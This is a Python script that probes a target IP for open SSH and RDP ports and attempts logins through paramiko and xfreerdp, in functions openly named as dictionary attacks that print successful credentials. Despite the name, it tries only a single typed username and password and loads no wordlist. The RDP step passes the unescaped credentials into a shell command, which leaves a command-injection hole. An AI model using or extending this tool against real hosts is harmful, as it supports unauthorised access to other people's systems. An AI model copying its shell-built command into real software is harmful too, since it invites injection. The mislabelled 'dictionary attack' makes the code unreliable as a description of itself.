import os
import paramiko
import socket
import subprocess


def is_port_open(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(2)
        s.connect((host, port))
        s.shutdown(2)
        return True
    except:
        return False


def ssh_dictionary_attack(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)
        print(f"SSH Login Successful: {username}:{password}")
       
        ssh.close()
        return True
    except:
        return False


def rdp_dictionary_attack(ip, username, password):
    cmd = f'xfreerdp /u:{username} /p:{password} /v:{ip}'
    try:
        subprocess.run(cmd, shell=True, check=True)
        print(f"RDP Login Successful: {username}:{password}")
        
        return True
    except subprocess.CalledProcessError:
        return False

def main():
    target_ip = input("Enter the target IP address: ")
    

    if is_port_open(target_ip, 22):  # SSH port
        username = input("Enter SSH username: ")
        
        password = input("Enter SSH password: ")

        if ssh_dictionary_attack(target_ip, username, password):

            pass

    if is_port_open(target_ip, 3389):  # RDP port
        username = input("Enter RDP username: ")
        
        password = input("Enter RDP password: ")

        if rdp_dictionary_attack(target_ip, username, password):
            
            pass

if __name__ == "__main__":
    main()
